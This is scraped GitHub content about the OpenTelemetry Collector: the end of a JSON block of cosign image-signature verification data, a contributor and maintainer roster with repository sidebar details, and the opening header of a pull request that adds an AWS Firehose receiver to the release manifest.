kdOM1dUSk9hVTlFVFhsTlIwVjVUVVJOZUU1WFdtMWFiVWt3VFZSUk1rOVhWWGRJVVZsTFMzZFpRa0pCUjBSMmVrRkNDa04zVVZCRVFURnVZVmhTYjJSWFNYUmhSemw2WkVkV2EwMUdTVWREYVhOSFFWRlJRbWMzT0hkQlVYZEZVa0Y0UTJGSVVqQmpTRTAyVEhrNWJtRllVbThLWkZkSmRWa3lPWFJNTWpsM1dsYzBkR1JIVm5OYVZ6RnNaRWhLTlV3eU9YZGFWelV3V2xkNGJHSlhWakJqYm10MFdUSTVjMkpIVm1wa1J6bDVURmhLYkFwaVIxWm9ZekpXZWsxRVowZERhWE5IUVZGUlFtYzNPSGRCVVRCRlMyZDNiMDlYVlhsTlIwcHRUbGROZUU1RVNteE9WRTEzVG5wQ2Fsa3lTVFJOZWtsM0NsbFVTWGROZWtVeFdtMWFiVmxxVVhoT1JGazFXbFJCYUVKbmIzSkNaMFZGUVZsUEwwMUJSVTlDUWsxTlJWaEtiRnB1VFhaa1IwWnVZM2s1TWsxRE5EVUtUME0wZDAxQ2EwZERhWE5IUVZGUlFtYzNPSGRCVVRoRlEzZDNTazVFUVhkTmFsVjZUbXBqTWsxRVJVZERhWE5IUVZGUlFtYzNPSGRCVWtGRlNYZDNhQXBoU0ZJd1kwaE5Oa3g1T1c1aFdGSnZaRmRKZFZreU9YUk1NamwzV2xjMGRHUkhWbk5hVnpGc1pFaEtOVTFDWjBkRGFYTkhRVkZSUW1jM09IZEJVa1ZGQ2tObmQwbE9SR3MxVDFSbmQwMUVTWGRuV1hOSFEybHpSMEZSVVVKbk56aDNRVkpKUldaUmVEZGhTRkl3WTBoTk5reDVPVzVoV0ZKdlpGZEpkVmt5T1hRS1RESTVkMXBYTkhSa1IxWnpXbGN4YkdSSVNqVk1NamwzV2xjMU1GcFhlR3hpVjFZd1kyNXJkRmt5T1hOaVIxWnFaRWM1ZVV4WVNteGlSMVpvWXpKV2VncE1lVFZ1WVZoU2IyUlhTWFprTWpsNVlUSmFjMkl6WkhwTU0wcHNZa2RXYUdNeVZYUlpNamwxWkVoS2NGbHBOVFZaVnpGelVVaEtiRnB1VFhaa1IwWnVDbU41T1RKTlF6UTFUME0wZDAxRVowZERhWE5IUVZGUlFtYzNPSGRCVWsxRlMyZDNiMDlYVlhsTlIwcHRUbGROZUU1RVNteE9WRTEzVG5wQ2Fsa3lTVFFLVFhwSmQxbFVTWGROZWtVeFdtMWFiVmxxVVhoT1JGazFXbFJCVlVKbmIzSkNaMFZGUVZsUEwwMUJSVlZDUVZsTlFraENNV015WjNka1VWbExTM2RaUWdwQ1FVZEVkbnBCUWtaUlVtNUVSMVp2WkVoU2QyTjZiM1pNTW1Sd1pFZG9NVmxwTldwaU1qQjJZak5DYkdKcE1UQmFWM2hzWWxkV01HTnVhM1ppTTBKc0NtSnVVbXhpUjFaMFdsaFNlV1ZUTVdwaU1uaHpXbGRPTUdJelNYUmpiVlp6V2xkR2VscFlUWFpaVjA0d1lWYzVkV041T1hsa1Z6VjZUSHBuTWs1RVJYZ0tUbnBGTVU1cVkzWlpXRkl3V2xjeGQyUklUWFpOYWtGWFFtZHZja0puUlVWQldVOHZUVUZGVjBKQlowMUNia0l4V1cxNGNGbDZRMEpwWjFsTFMzZFpRZ3BDUVVoWFpWRkpSVUZuVWpoQ1NHOUJaVUZDTWtGT01EbE5SM0pIZUhoRmVWbDRhMlZJU214dVRuZExhVk5zTmpRemFubDBMelJsUzJOdlFYWkxaVFpQQ2tGQlFVSnFjM1JvUlVOUlFVRkJVVVJCUldOM1VsRkpaMWg2Y2xaME0xQjRkU3ROWVZKRkswUkdORzlGUldNMGVucHphSGR1VDJ4bGMwZGlla2xwYnpNS0wxWmpRMGxSUkZNelJ6QmlNemRhYUhRNGFITjJUSEozYkc1UFFXYzJWRXh1U1ZSS09HTjNkMVEzTW5sMVRVdFlUbFJCUzBKblozRm9hMnBQVUZGUlJBcEJkMDV1UVVSQ2EwRnFRWGxFUkZSYVFqQlRPVXBGYkZsSGJuTnZWVmhLYm04MU5Fc3ZUVUZUTlN0RFFVMU9lbWRqUWpWQ2JrRk5OMWhNUjBoV01HRnhDbVpaY21weFkyOXFia3RaUTAxSFRWRnFjalpUVGt0Q2NVaEtZVGwxTDBSTlQySlpNa0pKTVV0ME4yTnhOemhFT0VOcVMzQmFVblJoYnpadFVVMUVZMk1LUms5M2VYWnhWalJPVld0dlpsRTlQUW90TFMwdExVVk9SQ0JEUlZKVVNVWkpRMEZVUlMwdExTMHRDZz09In19fX0=","integratedTime":1712809120,"logIndex":84797936,"logID":"c0d23d6ad406973f9559f3ba2d1ca01f84147d8ffc5b8445c224f98b9591801d"}},"Issuer":"https://token.actions.githubusercontent.com","Subject":"https://github.com/open-telemetry/opentelemetry-collector-releases/.github/workflows/base-release.yaml@refs/tags/v0.98.0","githubWorkflowName":"Release Contrib","githubWorkflowRef":"refs/tags/v0.98.0","githubWorkflowRepository":"open-telemetry/opentelemetry-collector-releases","githubWorkflowSha":"9e20bf5c142e53070ccb8320a20315fffb41469e","githubWorkflowTrigger":"push"}},{"critical":{"identity":{"docker-reference":"ghcr.io/open-telemetry/opentelemetry-collector-releases/opentelemetry-collector-contrib"},"image":{"docker-manifest-digest":"sha256:5cea85bcbc734a3c0a641368e5a4ea9d31b472997e9f2feca57eeb4a147fcf1a"},"type":"cosign container image signature"},"optional":{"1.3.6.1.4.1.57264.1.1":"https://token.actions.githubusercontent.com","1.3.6.1.4.1.57264.1.2":"push","1.3.6.1.4.1.57264.1.3":"9e20bf5c142e53070ccb8320a20315fffb41469e","1.3.6.1.4.1.57264.1.4":"Release Contrib","1.3.6.1.4.1.57264.1.5":"open-telemetry/opentelemetry-collector-releases","1.3.6.1.4.1.57264.1.6":"refs/tags/v0.98.0","Bundle":{"SignedEntryTimestamp":"MEUCIQD1ehDnPO6fzoPIpeQ3KFuYHHBiX7RcEbpo9B2r7JAlzwIgZ1bsuQz7gAXbNU1IEdsTQgfAnRk3xVXO16GnKXM2sAQ=","Payload":{"body":"eyJhcGlWZXJzaW9uIjoiMC4wLjEiLCJraW5kIjoiaGFzaGVkcmVrb3JkIiwic3BlYyI6eyJkYXRhIjp7Imhhc2giOnsiYWxnb3JpdGhtIjoic2hhMjU2IiwidmFsdWUiOiIxMzVjY2RlN2YzZTNhYjU2NmFmYzJhYWU3MDljYmJlNmFhMDZlZWMzNDA2MWNkZjMyNmRhYzM2MmY0NWM4Yjg4In19LCJzaWduYXR1cmUiOnsiY29udGVudCI6Ik1FUUNJRU92QXl0aE5RVGNvNHFMdG9GZUVOV0toNCtEK2I5SUxyYWhoa09WMmVBM0FpQjNEL2FpUGd1T05zUlB5alhaWk1hdnlCam0vMkVxNFNUMkZJWHozTnpyYWc9PSIsInB1YmxpY0tleSI6eyJjb250ZW50IjoiTFMwdExTMUNSVWRKVGlCRFJWSlVTVVpKUTBGVVJTMHRMUzB0Q2sxSlNVaHBSRU5EUW5jMlowRjNTVUpCWjBsVlZuRlRLMnd4WXpoMWVFUktOWEppZDAxMlVuaDBSR3hXVW1nMGQwTm5XVWxMYjFwSmVtb3dSVUYzVFhjS1RucEZWazFDVFVkQk1WVkZRMmhOVFdNeWJHNWpNMUoyWTIxVmRWcEhWakpOVWpSM1NFRlpSRlpSVVVSRmVGWjZZVmRrZW1SSE9YbGFVekZ3WW01U2JBcGpiVEZzV2tkc2FHUkhWWGRJYUdOT1RXcFJkMDVFUlhoTlJGRjRUMFJSZVZkb1kwNU5hbEYzVGtSRmVFMUVVWGxQUkZGNVYycEJRVTFHYTNkRmQxbElDa3R2V2tsNmFqQkRRVkZaU1V0dldrbDZhakJFUVZGalJGRm5RVVYyWlRCdGJrRkdRVzl1TVZoUGRIVlRMMXBNT0djeE5YUlJkVmxPTmtRemVUUlBWM0FLT1ZSTFMwUlVkRkJHU2xST1ZrWlJkVTlKUWs1bVJqWk1ORTlGYkd4dlZuUndaSE5uYjB0NVZGTnlPR3hTV1c1S1JIRlBRMEpwTUhkbloxbHdUVUUwUndwQk1WVmtSSGRGUWk5M1VVVkJkMGxJWjBSQlZFSm5UbFpJVTFWRlJFUkJTMEpuWjNKQ1owVkdRbEZqUkVGNlFXUkNaMDVXU0ZFMFJVWm5VVlZDSzFkSENuVmtlRE5IZUcxS1RWUkpUVVJyYW13clJtdzFXRzkzZDBoM1dVUldVakJxUWtKbmQwWnZRVlV6T1ZCd2VqRlphMFZhWWpWeFRtcHdTMFpYYVhocE5Ga0tXa1E0ZDJkWldVZEJNVlZrUlZGRlFpOTNVamhOU0hGSFpVZG9NR1JJUW5wUGFUaDJXakpzTUdGSVZtbE1iVTUyWWxNNWRtTkhWblZNV0ZKc1lrZFdkQXBhV0ZKNVpWTTVkbU5IVm5Wa1IxWnpXbGN4YkdSSVNqVk1WMDUyWWtkNGJGa3pVblpqYVRGNVdsZDRiRmxZVG14amVUaDFXakpzTUdGSVZtbE1NMlIyQ21OdGRHMWlSemt6WTNrNWFWbFlUbXhNV0Vwc1lrZFdhR015VlhWbFYwWjBZa1ZDZVZwWFducE1NMUpvV2pOTmRtUnFRWFZQVkdkMVRVUkJOVUpuYjNJS1FtZEZSVUZaVHk5TlFVVkNRa04wYjJSSVVuZGplbTkyVEROU2RtRXlWblZNYlVacVpFZHNkbUp1VFhWYU1td3dZVWhXYVdSWVRteGpiVTUyWW01U2JBcGlibEYxV1RJNWRFMUNTVWREYVhOSFFWRlJRbWMzT0hkQlVVbEZRa2hDTVdNeVozZE9aMWxMUzNkWlFrSkJSMFIyZWtGQ1FYZFJiMDlYVlhsTlIwcHRDazVYVFhoT1JFcHNUbFJOZDA1NlFtcFpNa2swVFhwSmQxbFVTWGROZWtVeFdtMWFiVmxxVVhoT1JGazFXbFJCWkVKbmIzSkNaMFZGUVZsUEwwMUJSVVVLUWtFNVUxcFhlR3haV0U1c1NVVk9kbUp1VW5saFYwbDNVRkZaUzB0M1dVSkNRVWRFZG5wQlFrSlJVWFppTTBKc1lta3hNRnBYZUd4aVYxWXdZMjVyZGdwaU0wSnNZbTVTYkdKSFZuUmFXRko1WlZNeGFtSXllSE5hVjA0d1lqTkpkR050Vm5OYVYwWjZXbGhOZDBoM1dVdExkMWxDUWtGSFJIWjZRVUpDWjFGU0NtTnRWbTFqZVRrd1dWZGtla3d6V1hkTWFtczBUR3BCZDA5M1dVdExkMWxDUWtGSFJIWjZRVUpEUVZGMFJFTjBiMlJJVW5kamVtOTJURE5TZG1FeVZuVUtURzFHYW1SSGJIWmliazExV2pKc01HRklWbWxrV0U1c1kyMU9kbUp1VW14aWJsRjFXVEk1ZEUxSlIwbENaMjl5UW1kRlJVRlpUeTlOUVVWS1FraHZUUXBsUjJnd1pFaENlazlwT0haYU1td3dZVWhXYVV4dFRuWmlVemwyWTBkV2RVeFlVbXhpUjFaMFdsaFNlV1ZUT1haalIxWjFaRWRXYzFwWE1XeGtTRW8xQ2t4WFRuWmlSM2hzV1ROU2RtTnBNWGxhVjNoc1dWaE9iR041T0hWYU1td3dZVWhXYVV3elpIWmpiWFJ0WWtjNU0yTjVPV2xaV0U1c1RGaEtiR0pIVm1nS1l6SlZkV1ZYUm5SaVJVSjVXbGRhZWt3elVtaGFNMDEyWkdwQmRVOVVaM1ZOUkVFMFFtZHZja0puUlVWQldVOHZUVUZGUzBKRGIwMUxSR3hzVFdwQ2FRcGFhbFpxVFZSUmVWcFVWWHBOUkdOM1dUSk9hVTlFVFhsTlIwVjVUVVJOZUU1WFdtMWFiVWt3VFZSUk1rOVhWWGRJVVZsTFMzZFpRa0pCUjBSMmVrRkNDa04zVVZCRVFURnVZVmhTYjJSWFNYUmhSemw2WkVkV2EwMUdTVWREYVhOSFFWRlJRbWMzT0hkQlVYZEZVa0Y0UTJGSVVqQmpTRTAyVEhrNWJtRllVbThLWkZkSmRWa3lPWFJNTWpsM1dsYzBkR1JIVm5OYVZ6RnNaRWhLTlV3eU9YZGFWelV3V2xkNGJHSlhWakJqYm10MFdUSTVjMkpIVm1wa1J6bDVURmhLYkFwaVIxWm9ZekpXZWsxRVowZERhWE5IUVZGUlFtYzNPSGRCVVRCRlMyZDNiMDlYVlhsTlIwcHRUbGROZUU1RVNteE9WRTEzVG5wQ2Fsa3lTVFJOZWtsM0NsbFVTWGROZWtVeFdtMWFiVmxxVVhoT1JGazFXbFJCYUVKbmIzSkNaMFZGUVZsUEwwMUJSVTlDUWsxTlJWaEtiRnB1VFhaa1IwWnVZM2s1TWsxRE5EVUtUME0wZDAxQ2EwZERhWE5IUVZGUlFtYzNPSGRCVVRoRlEzZDNTazVFUVhkTmFsVjZUbXBqTWsxRVJVZERhWE5IUVZGUlFtYzNPSGRCVWtGRlNYZDNhQXBoU0ZJd1kwaE5Oa3g1T1c1aFdGSnZaRmRKZFZreU9YUk1NamwzV2xjMGRHUkhWbk5hVnpGc1pFaEtOVTFDWjBkRGFYTkhRVkZSUW1jM09IZEJVa1ZGQ2tObmQwbE9SR3MxVDFSbmQwMUVTWGRuV1hOSFEybHpSMEZSVVVKbk56aDNRVkpKUldaUmVEZGhTRkl3WTBoTk5reDVPVzVoV0ZKdlpGZEpkVmt5T1hRS1RESTVkMXBYTkhSa1IxWnpXbGN4YkdSSVNqVk1NamwzV2xjMU1GcFhlR3hpVjFZd1kyNXJkRmt5T1hOaVIxWnFaRWM1ZVV4WVNteGlSMVpvWXpKV2VncE1lVFZ1WVZoU2IyUlhTWFprTWpsNVlUSmFjMkl6WkhwTU0wcHNZa2RXYUdNeVZYUlpNamwxWkVoS2NGbHBOVFZaVnpGelVVaEtiRnB1VFhaa1IwWnVDbU41T1RKTlF6UTFUME0wZDAxRVowZERhWE5IUVZGUlFtYzNPSGRCVWsxRlMyZDNiMDlYVlhsTlIwcHRUbGROZUU1RVNteE9WRTEzVG5wQ2Fsa3lTVFFLVFhwSmQxbFVTWGROZWtVeFdtMWFiVmxxVVhoT1JGazFXbFJCVlVKbmIzSkNaMFZGUVZsUEwwMUJSVlZDUVZsTlFraENNV015WjNka1VWbExTM2RaUWdwQ1FVZEVkbnBCUWtaUlVtNUVSMVp2WkVoU2QyTjZiM1pNTW1Sd1pFZG9NVmxwTldwaU1qQjJZak5DYkdKcE1UQmFWM2hzWWxkV01HTnVhM1ppTTBKc0NtSnVVbXhpUjFaMFdsaFNlV1ZUTVdwaU1uaHpXbGRPTUdJelNYUmpiVlp6V2xkR2VscFlUWFpaVjA0d1lWYzVkV041T1hsa1Z6VjZUSHBuTWs1RVJYZ0tUbnBGTVU1cVkzWlpXRkl3V2xjeGQyUklUWFpOYWtGWFFtZHZja0puUlVWQldVOHZUVUZGVjBKQlowMUNia0l4V1cxNGNGbDZRMEpwZDFsTFMzZFpRZ3BDUVVoWFpWRkpSVUZuVWpsQ1NITkJaVkZDTTBGT01EbE5SM0pIZUhoRmVWbDRhMlZJU214dVRuZExhVk5zTmpRemFubDBMelJsUzJOdlFYWkxaVFpQQ2tGQlFVSnFjM1JvUjJKSlFVRkJVVVJCUldkM1VtZEphRUZQZUZNM2RteDRjVzVGYTBKVVRtSlZVRUpsUkZSbk0waGtlRlkyY0cxWk9FdGliREV6TjNBS1lWUnViMEZwUlVFelMyMUxVbU5uYWxBeVQzSmxORVpyVm5vNU4xaENNWGRsUzBOeWFXazFTMWx2UTB0bVkxRktSREJSZDBObldVbExiMXBKZW1vd1JRcEJkMDFFWVVGQmQxcFJTWGhCUzNwcVpHMUZTV2gzV21Kb1lVSlNlalk1Y1N0MWVrNVZSMmxhYlRWVk4xcE5aWFJMUTFSM1VFTkljRkZQVldvdlVERkJDa2R0YWt3elJucFFObTVpYkRGblNYZFNUbXN6UkhkNWMwOUJUMHhoUVVoR09IaHhZV0ZzT0U5WGNGRmFhRGh4TTJVMVNVSmFXR0ZWVkhocFlWbGFTM29LUXpWS1RGVlNWbnBMTURsd04wVjBUd290TFMwdExVVk9SQ0JEUlZKVVNVWkpRMEZVUlMwdExTMHRDZz09In19fX0=","integratedTime":1712809122,"logIndex":84797940,"logID":"c0d23d6ad406973f9559f3ba2d1ca01f84147d8ffc5b8445c224f98b9591801d"}},"Issuer":"https://token.actions.githubusercontent.com","Subject":"https://github.com/open-telemetry/opentelemetry-collector-releases/.github/workflows/base-release.yaml@refs/tags/v0.98.0","githubWorkflowName":"Release Contrib","githubWorkflowRef":"refs/tags/v0.98.0","githubWorkflowRepository":"open-telemetry/opentelemetry-collector-releases","githubWorkflowSha":"9e20bf5c142e53070ccb8320a20315fffb41469e","githubWorkflowTrigger":"push"}}]
```

Note

We started signing the images with release `v0.95.0`

## Contributing

See the [Contributing Guide](/open-telemetry/opentelemetry-collector/blob/main/CONTRIBUTING.md) for details.

Here is a list of community roles with current and previous members:

* Triagers ([@open-telemetry/collector-triagers](https://github.com/orgs/open-telemetry/teams/collector-triagers)):

  + [Andrzej Stencel](https://github.com/andrzej-stencel), Elastic
  + [Damien Mathieu](https://github.com/dmathieu), Elastic
  + [Jade Guiton](https://github.com/jade-guiton-dd), Datadog
  + Actively seeking contributors to triage issues
* Emeritus Triagers:

  + [Andrew Hsu](https://github.com/andrewhsu)
  + [Alolita Sharma](https://github.com/alolita)
  + [Punya Biswal](https://github.com/punya)
  + [Steve Flanders](https://github.com/flands)
* Approvers ([@open-telemetry/collector-approvers](https://github.com/orgs/open-telemetry/teams/collector-approvers)):

  + [Antoine Toulme](https://github.com/atoulme), Splunk
  + [Daniel Jaglowski](https://github.com/djaglowski), observIQ
  + [Evan Bradley](https://github.com/evan-bradley), Dynatrace
  + [Juraci Paixão Kröhling](https://github.com/jpkrohling), Grafana Labs
  + [Tyler Helmuth](https://github.com/TylerHelmuth), Honeycomb
  + [Yang Song](https://github.com/songy23), Datadog
* Emeritus Approvers:

  + [James Bebbington](https://github.com/james-bebbington)
  + [Jay Camp](https://github.com/jrcamp)
  + [Nail Islamov](https://github.com/nilebox)
  + [Owais Lone](https://github.com/owais)
  + [Rahul Patel](https://github.com/rghetia)
  + [Steven Karis](https://github.com/sjkaris)
  + [Anthony Mirabella](https://github.com/Aneurysm9)
* Maintainers ([@open-telemetry/collector-maintainers](https://github.com/orgs/open-telemetry/teams/collector-maintainers)):

  + [Alex Boten](https://github.com/codeboten), Honeycomb
  + [Bogdan Drutu](https://github.com/BogdanDrutu), Snowflake
  + [Dmitrii Anoshin](https://github.com/dmitryax), Splunk
  + [Pablo Baeyens](https://github.com/mx-psi), DataDog
* Emeritus Maintainers:

  + [Paulo Janotti](https://github.com/pjanotti)
  + [Tigran Najaryan](https://github.com/tigrannajaryan)

Learn more about roles in [Community membership](https://github.com/open-telemetry/community/blob/main/community-membership.md).
In addition to what is described at the organization-level, the SIG Collector requires all core approvers to take part in rotating
the role of the [release manager](/open-telemetry/opentelemetry-collector/blob/main/docs/release.md#release-manager).

Thanks to all the people who already contributed!

[![](https://camo.githubusercontent.com/4c63f855c0966702263462c764c0a9d9ff521bdf0253c831f3806b0290ca6f40/68747470733a2f2f636f6e7472696275746f72732d696d672e7765622e6170702f696d6167653f7265706f3d6f70656e2d74656c656d657472792f6f70656e74656c656d657472792d636f6c6c6563746f72)](https://github.com/open-telemetry/opentelemetry-collector/graphs/contributors)

## About

OpenTelemetry Collector

[opentelemetry.io](https://opentelemetry.io "https://opentelemetry.io")

### Topics

[monitoring](/topics/monitoring "Topic: monitoring")
[metrics](/topics/metrics "Topic: metrics")
[telemetry](/topics/telemetry "Topic: telemetry")
[observability](/topics/observability "Topic: observability")
[opentelemetry](/topics/opentelemetry "Topic: opentelemetry")
[open-telemetry](/topics/open-telemetry "Topic: open-telemetry")

### Resources

[Readme](#readme-ov-file)
### License

[Apache-2.0 license](#Apache-2.0-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/open-telemetry/opentelemetry-collector/activity)
[Custom properties](/open-telemetry/opentelemetry-collector/custom-properties)
### Stars

[**4.7k**
stars](/open-telemetry/opentelemetry-collector/stargazers)
### Watchers

[**86**
watching](/open-telemetry/opentelemetry-collector/watchers)
### Forks

[**1.5k**
forks](/open-telemetry/opentelemetry-collector/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector&report=open-telemetry+%28user%29)

## [Releases 185](/open-telemetry/opentelemetry-collector/releases)

[v0.117.0
Latest

Jan 7, 2025](/open-telemetry/opentelemetry-collector/releases/tag/v0.117.0)
[+ 184 releases](/open-telemetry/opentelemetry-collector/releases)

## [Packages 0](/orgs/open-telemetry/packages?repo_name=opentelemetry-collector)

No packages published

## [Contributors 458](/open-telemetry/opentelemetry-collector/graphs/contributors)

* [![@bogdandrutu](https://avatars.githubusercontent.com/u/1373887?s=64&v=4)](https://github.com/bogdandrutu)
* [![@dmitryax](https://avatars.githubusercontent.com/u/6628631?s=64&v=4)](https://github.com/dmitryax)
* [![@codeboten](https://avatars.githubusercontent.com/u/223565?s=64&v=4)](https://github.com/codeboten)
* [![@dependabot[bot]](https://avatars.githubusercontent.com/in/29110?s=64&v=4)](https://github.com/apps/dependabot)
* [![@renovate[bot]](https://avatars.githubusercontent.com/in/2740?s=64&v=4)](https://github.com/apps/renovate)
* [![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=64&v=4)](https://github.com/mx-psi)
* [![@opentelemetrybot](https://avatars.githubusercontent.com/u/107717825?s=64&v=4)](https://github.com/opentelemetrybot)
* [![@tigrannajaryan](https://avatars.githubusercontent.com/u/4194920?s=64&v=4)](https://github.com/tigrannajaryan)
* [![@TylerHelmuth](https://avatars.githubusercontent.com/u/12352919?s=64&v=4)](https://github.com/TylerHelmuth)
* [![@atoulme](https://avatars.githubusercontent.com/u/16758?s=64&v=4)](https://github.com/atoulme)
* [![@djaglowski](https://avatars.githubusercontent.com/u/5255616?s=64&v=4)](https://github.com/djaglowski)
* [![@songy23](https://avatars.githubusercontent.com/u/10536136?s=64&v=4)](https://github.com/songy23)
* [![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=64&v=4)](https://github.com/jpkrohling)
* [![@odeke-em](https://avatars.githubusercontent.com/u/4898263?s=64&v=4)](https://github.com/odeke-em)

[+ 444 contributors](/open-telemetry/opentelemetry-collector/graphs/contributors)

## Languages

* [Go
  98.7%](/open-telemetry/opentelemetry-collector/search?l=go)
* Other
  1.3%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f1c0a7ed_20250111_082355.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Fpull%2F74)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Fpull%2F74)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector-releases)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector-releases](/open-telemetry/opentelemetry-collector-releases)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases) You must be signed in to change notification settings
* [Fork
  165](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases)
* [Star
   267](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases)

* [Code](/open-telemetry/opentelemetry-collector-releases)
* [Issues
  56](/open-telemetry/opentelemetry-collector-releases/issues)
* [Pull requests
  12](/open-telemetry/opentelemetry-collector-releases/pulls)
* [Actions](/open-telemetry/opentelemetry-collector-releases/actions)
* [Projects
  0](/open-telemetry/opentelemetry-collector-releases/projects)
* [Security](/open-telemetry/opentelemetry-collector-releases/security)
* [Insights](/open-telemetry/opentelemetry-collector-releases/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector-releases)
* [Issues](/open-telemetry/opentelemetry-collector-releases/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector-releases/pulls)
* [Actions](/open-telemetry/opentelemetry-collector-releases/actions)
* [Projects](/open-telemetry/opentelemetry-collector-releases/projects)
* [Security](/open-telemetry/opentelemetry-collector-releases/security)
* [Insights](/open-telemetry/opentelemetry-collector-releases/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [receiver/awsfirehose] Add AWS Firehose receiver to contrib manifest. #74

 Merged

[jpkrohling](/jpkrohling)
merged 2 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector-releases/tree/main "open-telemetry/opentelemetry-collector-releases:main")
from
[jefchien:add-firehose-receiver](/jefchien/opentelemetry-collector-releases/tree/add-firehose-receiver "jefchien/opentelemetry-collector-releases:add-firehose-receiver")

Apr 13, 2022

 Merged

# [[receiver/awsfirehose] Add AWS Firehose receiver to contrib manifest.](#top) #74

[jpkrohling](/jpkrohling)
merged 2 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector-releases/tree/main "open-telemetry/opentelemetry-collector-releases:main")
from
[jefchien:add-firehose-receiver](/jefchien/opentelemetry-collector-releases/tree/add-firehose-receiver "jefchien/opentelemetry-collector-releases:add-firehose-receiver")

Apr 13, 2022

[Conversation
1](/open-telemetry/opentelemetry-collector-releases/pull/74)
[Commits
2](/open-telemetry/opentelemetry-collector-releases/pull/74/commits)
[Checks
0](/open-telemetry/opentelemetry-collector-releases/pull/74/checks)
[Files changed](/open-telemetry/opentelemetry-collector-releases/pull/74/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![jefchien](https://avatars.githubusercontent.com/u/84729962?s=60&v=4)](/jefchien)

Copy link

Contributor

